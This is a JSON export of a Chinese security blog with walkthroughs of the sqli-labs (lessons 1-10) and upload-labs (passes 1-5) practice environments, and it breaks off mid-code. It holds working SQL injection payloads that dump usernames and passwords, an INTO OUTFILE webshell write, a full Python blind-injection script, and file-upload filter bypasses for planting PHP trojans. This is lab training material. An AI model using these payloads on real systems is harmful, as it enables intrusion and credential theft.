{"meta":{"title":"DD's Blog","subtitle":null,"description":null,"author":"DD","url":"https://ddstick.github.io","root":"/"},"pages":[],"posts":[{"title":"Sqli-labs-GET Part 1-10","slug":"Sqli-labs-GET Part 1-10","date":"2019-08-02T09:53:52.000Z","updated":"2019-08-16T08:15:09.936Z","comments":true,"path":"2019/08/02/Sqli-labs-GET Part 1-10/","link":"","permalink":"https://ddstick.github.io/2019/08/02/Sqli-labs-GET Part 1-10/","excerpt":"","text":"Sqli-labs注入练习SQL Injection：是Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 sqli-labs是一个非常好的学习sql注入的一个游戏教程，对于了解sqlmap的原理很有帮助。 项目地址：https://github.com/Audi-1/sqli-labs 安装首先安装phpstudy或者xampp 将下载的文件解压发在：phpstudy的WWW文件夹里 或者 xampp里面的htdocs文件夹里面 修改mysql文件的账号密码： 在sqli-labs-master\\sql-connections里面有个db-creds.inc文件，打开并修改账号密码 进入页面进行安装 打开网页输入：localhost/sqli-labs-master 点击第一个：Setup/reset Database for labs 出现下面页面为正确 返回 完成 Less-1：基于错误的_get_单引号_字符型注入 Please input the ID as parameter with numeric value //“请输入ID为数值的参数” 所以我们在url后输入：?id=1，回车，得到下面的页面： 输一个id值，返回了name和password，接着测试是否能注入，url后加上?id=1’，发现报错了，直接报的数据库的错，对web浏览器用户透明，那么可以从报错中得到很多信息，比如这是个MySQL的数据库，还可以猜想到后台的sql语句，应该是 1“SELECT * FROM table_name WHERE id='$_get['id']' LIMIT 0,1” 这种，说明他没有过滤单引号，并且id是char型的输入，之所以报错是因为用了单引号，导致后面的部分“’LIMT 0,1;”多余出来了 于是构造sql语句-1‘OR’1’=’1’--+屏蔽掉后面的，也可以用#屏蔽，但这里#没有被url编码，故需自己将他转成url编码%231’=’1’为万能密码之一 注入成功~接着来猜字段1’ order by 3，有3个字段存在1’ order by 3： 再试试4个,没有第4个字段了，即没有第4列1’ order by 4： 接着用union 语句爆字段，但始终只显示一条记录，看了下源码，发现他并没有将结果循环输出，而是只返回符合查询结果的第一条记录 于是利用联合查询的特点，使原查询左边为空，那么我们定义的查询结果便可以返回出来-1’ union select 1,2,3%23之所以改为id=-1而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可 于是我们可以通过这里使用数据库的函数来爆出数据库的信息，构造如下语句-1’ union select 1,2,concat_ws(char(32,44,32),user(),database());%23 这里用到的数据库函数有cancat_ws()，char()，user()，database()，cancat_ws()是连接函数，第一个参数是分隔符，同样作用的函数还有cancat()，不同的是cancat()有不同的连接符，char()函数是将十进制参数转换成对应的acsii码，user()和database()都是内置的函数，分别返回用户名和数据库名，类似的函数还有version()，返回数据库的版本信息，但是没有直接返回表名的函数，所以需要通过其他方式获取表名 这里有一个很经典的方法，我们可以通过系统数据库information_schema来获取表名，information_schema数据库中含有很重要的三张表：SCHEMATA，TABLES和COLUMNSSCHEMATA表中存储了MySQL中所有数据库的信息，包括数据库名，编码类型路径等，show databases的结果取之此表 TABLES表中存储了MySQL中所有数据库的表的信息（当然，索引是根据数据库名的），包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等，show tables from schemaname的结果取之此表 COLUMNS表中存储了MySQL中所有表的字段信息，show columns from schemaname.tablename的结果取之此表 于是，我们可以构造?id=-1’ union select 1,2,table_name from information_schema where table_schema=’security’%23 这样就爆出了第一张表名，但要获取所有表名还需要用到’limit’，limit是用来指定范围，他有两个参数（limit a，b）a是从第几行开始取，b是取多少行，但需要注意的是实际取出来的开始行下标比a大1，即limit 5,10是表示取6到15行数据，接下来我们就可以用它取指定范围的表了-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 3,1--+ 这里取的是第4张表，如果超出能取的范围，他会报错-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 4,1--+ 于是通过修改limit的范围我们获取到了所有的表名，且与数据库中的表名一致，其中users表用来存储用户信息的可能性最大，于是，我们可以用同样的方法爆他的字段名-1’ union select 1,2,column_name from information_schema.colums where table_schema=’security’ and table_name=’users’ limit 0,1%23 获取到的字段名有三个id，username，password，于是我们就可以构造语句了-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 0,1 %23 同样的，改变limit的范围以获取所有用户信息-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 1,1 %23 还有一种方法是通过group分组代替limit将所有信息列出来，查找表名可以构造如下payload：-1’ union select 1,2,gruop_concat(char(32),table_name,char(32)) from information_schema.tables where talbe_schema=’security’--+ 查找字段也是同样-1’ union select 1,2,gruop_concat(char(32),column_name,char(32)) from information_schema.columns where talbe_schema=’security’ and table_name=’users’--+ 最后的payload可以合并不同的列，上下对应输出-1’ union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users--+ Less-2：基于错误的_get_整型注入开头跟les1一样尝试单引号：?id=’ 这里的报错与less-1不同了，从报错可以看出，此处的id是当做数值来处理的，因为sql语句对于数字型的数据可以不加单引号，而less-1是作为字符串来处理的，猜想后台sql语句应该是select * from table_name where id = $_get[‘id’] limit 0,1于是构造-1 or 1=1?id=-1 or 1=1%23 可以注入，接着用和之前相同的方法先报数据库名，然后是表名，接着是字段，最后的payload如下?id=-1 union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users--+ Less-3：基于报错的_get_单引号_变形_字符型注入?id=’ 查看源代码 123$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); 看报错，所谓变形就是用)代替了空格，猜想后台sql是select * from table_name where id =(‘$_get[‘id’]’)limit 0,1于是构造-1’)or’1’=’1’--+?id=-1’)or’1’=’1’--+ 最后的payload:?id=-1’) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 1,1%23 Less-4：基于错误的_get_双引号_字符型注入?id=-1’ 尝试单引号正常无报错信息，因为在php中双引号可以包含单引号，输入单引号后台就变成了id=(“$_GET[‘id’]’”) 于是尝试双引号，查看报错信息，猜想后台sql语句为select * from table_name where id =(“$_get[‘id’]”)limit 0,1；构造如下sql注入：?id=-1”)or 1=1--+ payload:?id=-1”) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 0,1%23 less-5：双注入_get_单引号_字符型注入当输入?id=1时页面显示正常?id=1 什么都没有，然后注意到提示是“双注入”，于是百度了一下，总结如下： 双注入查询双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数： 1234rand()随机函数，返回0~1之间的某个值floor(a)取整函数，返回小于等于a，且值最接近a的一个整数count()聚合函数也称作计数函数，返回查询对象的总数group by cluase分组语句，按照cluase对查询结果分组 双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式，于是payload构造如下：?id=-1’ union select count(),2,concat(‘‘,(select database()),’‘,floor(rand()2)) as a from information_schema.tables group by a--+ 获取到数据库名后再用同样的方法获取表名?id=-1’ union select count(),2,concat(‘‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’‘,floor(rand()2)) as a from information_schema.tables group by a--+ 然后是用户信息，这里只能查询一行，所以不能用group_concat，可以修改limit的范围来遍历用户信息?id=-1’ union select count(),2,concat(‘‘,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),’‘,floor(rand()2)) as a from information_schema.tables group by a--+ Less-6：双注入_get_双引号_字符型注入换汤不换药，按照Less-5的方法，只是把单引号改成了双引号，直接上payload:?id=-1” union select count(),2,concat(‘‘,(select concat_ws(char(44),id,username,password) from users limit 1,1),’‘,floor(rand()2)) as a from information_schema.tables group by a--+ Less-7：导出文件_get_字符型注入 尝试之前的方法行不通了，他把报错做了处理统一返回“You have an error in your SQL syntax”，明显的，他也给出了提示use outfile，outfile的固定结构是： 1select A into outfile B 这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息，于是这里就有两种思路： 第一种，将小马写入文件中，用菜刀拿下：所以大概要使用文件导出。Mysql数据库需要在指定的目录下进行数据的导出，secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户具有FILE权限。如果这个参数为空，这个变量没有效果；如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。show variables like ‘%secure%’; ?id=-1’)) union select 1,2,’‘ into outfile “/var/lib/mysql-files/DD.php”--+ 但看了其他daloa的wp，都涉及到路径的转义dalao都是在Win下操作的，所以需要，而Linux和Win不同，所有此处不太一样 第一种，构造select * from users into outfile “数据库导入导出数据的目录”?id=-1’)) union select group_concat(username),’*‘,group_concat(password) from users into outfile “/var/lib/mysql-files/DD.txt”--+ 小扩展：winserver的iis默认路径c:\\Inetpub\\wwwroot linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等 apache 就…/var/www/htm，…/var/www/html/htdocs phpstudy 就是…\\PhpStudy20180211\\PHPTutorial\\WWW\\ xammp 就是…\\xampp\\htdocs 导入导出数据还会涉及到哪些函数： @@datadir：数据库存储路径 @@basedir：MySQL安装路径 dumpfile：导出文件，类似outfile，不同的是，dumpfile一次导出一行，会和limit结合使用 load_file()：将文件导入mysql，用法 select load_file(“文件路径”); Less-8：bool型_单引号_盲注Less-8源码:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;Less-8 Blind- Boolian- Single Quotes- String&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"#000000\"&gt;&lt;div style=\" margin-top:60px;color:#FFF; font-size:23px; text-align:center\"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=\"#FF0000\"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=\"3\" color=\"#FFFF00\"&gt;&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sqli-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysqli_query($con1, $sql);$row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; //echo 'You are in...........'; //print_r(mysqli_error($con1)); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=\"../images/Less-8.jpg\" /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; ?id=1 尝试单引号却什么都没返回，看了下源码就是这样处理的，点题盲注，盲注主要分为bool型和时间性，通常涉及到这几个函数: 盲注常用函数&amp;&amp;固有公式：1234567891011length(str)：返回字符串str的长度substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的mid(str,pos,len)：和substr()类似ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码）ord()：同上，返回acsii码left(str,len)：对字符串str左截取len长度right(str,len)：对字符串str右截取len长度if(a,b,c)：条件判断，如果a为true，返回b，否则返回c盲注有个固定式：and ascii(substr(A,1,1))&gt;B，或者and if(ascii(substr(A,1,1))&gt;B,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码，他们的中心思想都是通过substr等截取函数以二分法的形式查询逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑 下面是盲注匹配的一个例子，我们来匹配数据库名，在之前的实验中已知数据库名是security，下面的sql语句是用来匹配数据库名的第一个字母?id=1’ and ascii(substr((select database()),1,1))&gt;114--+ 字母s的ascii码是115，所以他大于114，结果为true，页面显示正常，依次类推即可 也可以用脚本来跑，dalao那拿来的 盲注脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199# -*-coding:utf-8-*- \"\"\" @version: @author: giantbranch @file: code_inject.py @time: 2016/5/1 \"\"\" import urllib2 import urllib success_str = \"You are in\" getTable = \"users\" index = \"0\" url = \"http://localhost/sqli-labs/Less-8/?id=1\" database = \"database()\" selectDB = \"select database()\" selectTable = \"select table_name from information_schema.tables where table_schema='%s' limit %d,1\" asciiPayload = \"' and ascii(substr((%s),%d,1))&gt;=%d #\" lengthPayload = \"' and length(%s)&gt;=%d #\" selectTableCountPayload = \"'and (select count(table_name) from information_schema.tables where table_schema='%s')&gt;=%d #\" selectTableNameLengthPayloadfront = \"'and (select length(table_name) from information_schema.tables where table_schema='%s' limit \" selectTableNameLengthPayloadbehind = \",1)&gt;=%d #\" # 发送请求，根据页面的返回的判断长度的猜测结果 # string:猜测的字符串 payload:使用的payload length：猜测的长度 def getLengthResult(payload, string, length): finalUrl = url + urllib.quote(payload % (string, length)) res = urllib2.urlopen(finalUrl) if success_str in res.read(): return True else: return False # 发送请求，根据页面的返回的判断猜测的字符是否正确 # payload:使用的payload string:猜测的字符串 pos：猜测字符串的位置 ascii：猜测的ascii def getResult(payload, string, pos, ascii): finalUrl = url + urllib.quote(payload % (string, pos, ascii)) res = urllib2.urlopen(finalUrl) if success_str in res.read(): return True else: return False # 注入 def inject(): # 猜数据库长度 lengthOfDBName = getLengthOfString(lengthPayload, database) print \"length of DBname: \" + str(lengthOfDBName) # 获取数据库名称 DBname = getName(asciiPayload, selectDB, lengthOfDBName) print \"current database:\" + DBname # 获取数据库中的表的个数 # print selectTableCountPayload tableCount = getLengthOfString(selectTableCountPayload, DBname) print \"count of talbe:\" + str(tableCount) # 获取数据库中的表 for i in xrange(0,tableCount): # 第几个表 num = str(i) # 获取当前这个表的长度 selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname) print \"current table length:\" + str(tableNameLength) # 获取当前这个表的名字 selectTableName = selectTable%(DBname, i) tableName = getName(asciiPayload, selectTableName ,tableNameLength) print tableName selectColumnCountPayload = \"'and (select count(column_name) from information_schema.columns where table_schema='\"+ DBname +\"' and table_name='%s')&gt;=%d #\" # print selectColumnCountPayload # 获取指定表的列的数量 columnCount = getLengthOfString(selectColumnCountPayload, getTable) print \"table:\" + getTable + \" --count of column:\" + str(columnCount) # 获取该表有多少行数据 dataCountPayload = \"'and (select count(*) from %s)&gt;=%d #\" dataCount = getLengthOfString(dataCountPayload, getTable) print \"table:\" + getTable + \" --count of data: \" + str(dataCount) data = [] # 获取指定表中的列 for i in xrange(0,columnCount): # 获取该列名字长度 selectColumnNameLengthPayload = \"'and (select length(column_name) from information_schema.columns where table_schema='\"+ DBname +\"' and table_name='%s' limit \"+ str(i) +\",1)&gt;=%d #\" # print selectColumnNameLengthPayload columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable) print \"current column length:\" + str(columnNameLength) # 获取该列的名字 selectColumn = \"select column_name from information_schema.columns where table_schema='\"+ DBname +\"' and table_name='%s' limit %d,1\" selectColumnName = selectColumn%(getTable, i) # print selectColumnName columnName = getName(asciiPayload, selectColumnName ,columnNameLength) print columnName tmpData = [] tmpData.append(columnName) # 获取该表的数据 for j in xrange(0,dataCount): columnDataLengthPayload = \"'and (select length(\"+ columnName +\") from %s limit \" + str(j) + \",1)&gt;=%d #\" # print columnDataLengthPayload columnDataLength = getLengthOfString(columnDataLengthPayload, getTable) # print columnDataLength selectData = \"select \" + columnName + \" from users limit \" + str(j) + \",1\" columnData = getName(asciiPayload, selectData, columnDataLength) # print columnData tmpData.append(columnData) data.append(tmpData) # print data # 格式化输出数据 # 输出列名 tmp = \"\" for i in xrange(0,len(data)): tmp += data[i][0] + \" \" print tmp # 输出具体数据 for j in xrange(1,dataCount+1): tmp = \"\" for i in xrange(0,len(data)): tmp += data[i][j] + \" \" print tmp # 获取字符串的长度 def getLengthOfString(payload, string): # 猜长度 lengthLeft = 0 lengthRigth = 0 guess = 10 # 确定长度上限，每次增加5 while 1: # 如果长度大于guess if getLengthResult(payload, string, guess) == True: # 猜测值增加5 guess = guess + 5 else: lengthRigth = guess break # print \"lengthRigth: \" + str(lengthRigth) # 二分法查长度 mid = (lengthLeft + lengthRigth) / 2 while lengthLeft &lt; lengthRigth - 1: # 如果长度大于等于mid if getLengthResult(payload, string, mid) == True: # 更新长度的左边界为mid lengthLeft = mid else: # 否则就是长度小于mid # 更新长度的右边界为mid lengthRigth = mid # 更新中值 mid = (lengthLeft + lengthRigth) / 2 # print lengthLeft, lengthRigth # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid # 所以长度区间：大于等于 lengthLeft，小于lengthRigth # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度 # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8 return lengthLeft # 获取名称 def getName(payload, string, lengthOfString): # 32是空格，是第一个可显示的字符，127是delete，最后一个字符 tmp = '' for i in xrange(1,lengthOfString+1): left = 32 right = 127 mid = (left + right) / 2 while left &lt; right - 1: # 如果该字符串的第i个字符的ascii码大于等于mid if getResult(payload, string, i, mid) == True: # 则更新左边界 left = mid mid = (left + right) / 2 else: # 否则该字符串的第i个字符的ascii码小于mid # 则更新右边界 right = mid # 更新中值 mid = (left + right) / 2 tmp += chr(left) # print tmp return tmp def main(): inject()main() Less-9基于时间的GET单引号盲注Less-9源码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;Less-9 Blind- Time based- Single Quotes- String&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"#000000\"&gt;&lt;div style=\" margin-top:60px;color:#FFF; font-size:23px; text-align:center\"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=\"#FF0000\"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=\"3\" color=\"#FFFF00\"&gt;&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sqli-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysqli_query($con1, $sql);$row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; //print_r(mysqli_error($con1)); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=\"../images/Less-9.jpg\" /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 输入?id=1后仍与上题无异 时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in……”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是“You are in…..” 这样，我们就不能根据他页面的返回内容来判断匹配结果了，因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：?id=1’ and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))--+ 这里的意思是，如果数据库名首字母的ascii码大于115，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了，盲注脚本与less-8类似，只需要加入sleep函数即可 Less-10 基于时间的双引号盲注把第九题的单引号改为双引号即可?id=1” and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))--+","categories":[],"tags":[]},{"title":"Upload-labs","slug":"Upload-labs","date":"2019-07-31T00:19:52.000Z","updated":"2019-08-01T10:52:13.232Z","comments":true,"path":"2019/07/31/Upload-labs/","link":"","permalink":"https://ddstick.github.io/2019/07/31/Upload-labs/","excerpt":"","text":"文件上传漏洞练习Upload-labs是一个帮你总结各种类型的上传漏洞的靶场，包括常见的文件上传漏洞项目地址：https://github.com/c0ny1/upload-labs Summary 构造优质上传漏洞Fuzz字典http://www.hacksec.cn/Tools/866.html Pass-01 js检查直接上传php木马，发现前端报错： 在这使用传统的抓包，修改后缀名。是可以上传成功的，但是不是这一关的目的，我们看看源代码分析一波 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，只是在客户端使用js对不合法图片进行检查，我们可以尝试绕过 如果是前端验证我们可以选择火狐浏览器中的NoScript插件禁用js,这样我们就可以安全的上传 但对于前端的过滤没有必要这么复杂，其实，还可以这样，直接把过滤的函数cheakfile()在上传前删掉，也可以上传成功 或者修改参数 在白名单中加上.php 复制该函数于控制台并回车 随后即可成功上传 Pass-02 验证Content-type本题中使用传统的抓包，单纯修改后缀名是不行的查看源码观察一下： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 基础姿势：12345$_FILES[\"file\"][\"name\"] – 被上传文件的名称$_FILES[\"file\"][\"type\"] – 被上传文件的类型$_FILES[\"file\"][\"size\"] – 被上传文件的大小，以字节计$_FILES[\"file\"][\"tmp_name\"] – 存储在服务器的文件的临时副本的名称$_FILES[\"file\"][\"error\"] – 由文件上传导致的错误代码 123456move_uploaded_file(file,newloc) 函数将上传的文件移动到新位置。参数 描述file 必需。规定要移动的文件。newloc 必需。规定文件的新位置。如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。 发现只是对文件类型Content-type进行过虑于是上传xxx.php文件抓包修改content-type为image/jpeg或其他绕过 修改为： 点击Forward发送 Pass-03 黑名单绕过不能上传，但能上传 php.jpg，php.asd 说明是黑名单限制 发现是黑名单判断，服务器端禁止上传’.asp’,’.aspx’,’.php’,’.jsp’后缀的脚本文件其采用的黑名单，php的话有时候php3、php4、php5、phtml、pht这些后缀也是可以被解析的（配置的原因），其他语言也有类似的情况，需要尝试： 上传木马抓包 修改文件名后缀（配置不同，可解析的后缀也不同）： Pass-04 .htaccess绕过上传.htaccess文件需要：|1.mod_rewrite模块开启|2.AllowOverride All| 该题的源码为： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 发现同样有黑名单过滤，但是发下有一个文件是没有过滤，也是我们上传过程中经常用到的.htaccess .htaccess重点姿势.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。它里面有这样一段代码：AllowOverride None，如果我们把None改成All 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 可以通过上传.htaccess文件然后将该文件夹下的所有例如.jpg的文件都按照脚本语言解析，上传如下内容的.htaccess文件： 意思是将文件夹下的one.jpg文件按照php格式去解析，然后再上传一个文件名为one.jpg内容为木马的文件，然后访问，可以执行代码（其中.jpg也可换成test等其他，但其他也需改变） 或 或 这样所有文件都会解析为php 上传成功后，在上传个图片马： 发现成功上传，可以访问一下，发现成功执行： Pass-05 大小写绕过——Windows拿源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; 